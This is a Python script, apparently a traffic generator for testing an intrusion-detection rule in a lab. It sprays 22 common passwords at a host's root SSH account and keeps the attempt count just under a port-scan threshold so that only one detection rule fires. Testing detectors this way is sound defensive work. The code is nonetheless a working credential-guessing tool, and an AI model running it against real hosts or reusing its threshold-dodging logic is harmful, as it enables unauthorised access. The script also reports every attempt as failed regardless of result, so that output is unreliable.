#!/usr/bin/env python3
"""
quick_ssh_spray.py — Fast SSH brute force, 22 attempts.

Triggers ONLY the failed_conn rule (>20 failed connections in 30 s).
All attempts target port 22 only (1 unique port), so the port_scan rule
(needs >10 unique ports) never fires. ONE Sentinel event — one run.

Usage:
    python3 quick_ssh_spray.py [--target 172.20.0.10] [--port 22]
"""
from __future__ import annotations

import argparse
import time

import paramiko  # type: ignore[import]
from rich.console import Console
from rich.panel import Panel
from rich import box

console = Console()

_WORDLIST = [
    "password", "123456", "admin", "root", "toor",
    "pass", "test", "1234", "qwerty", "abc123",
    "letmein", "monkey", "master", "dragon", "sunshine",
    "welcome", "shadow", "batman", "hello", "charlie",
    "donald", "access",
]  # exactly 22 — just enough to cross the >20 threshold


def _attempt(host: str, port: int, password: str) -> None:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            host, port=port, username="root", password=password,
            timeout=2, banner_timeout=3, auth_timeout=2,
        )
    except Exception:
        pass
    finally:
        client.close()


def main() -> None:
    parser = argparse.ArgumentParser(description="Quick SSH credential spray")
    parser.add_argument("--target", default="172.20.0.10")
    parser.add_argument("--port",   type=int, default=22)
    args = parser.parse_args()

    console.print(Panel(
        f"  [dim]Target:   [/dim]  [bold cyan]{args.target}:{args.port}[/bold cyan]\n"
        f"  [dim]Passwords:[/dim]  [white]{len(_WORDLIST)} attempts[/white]  "
        f"[dim](triggers failed_conn rule only)[/dim]",
        title="[bold red]🔑  QUICK SSH SPRAY[/bold red]",
        border_style="red",
        box=box.DOUBLE,
        padding=(0, 1),
    ))

    console.print(f"\n  Spraying {len(_WORDLIST)} passwords at {args.target}:{args.port}...\n")

    for i, password in enumerate(_WORDLIST, 1):
        _attempt(args.target, args.port, password)
        console.print(f"  [{i:>2}/{len(_WORDLIST)}]  [dim]{password}[/dim]  →  [red]✗[/red]")
        time.sleep(0.3)

    console.print(f"\n  [bold green]✓  Done[/bold green]  │  {len(_WORDLIST)} attempts completed\n")


if __name__ == "__main__":
    main()
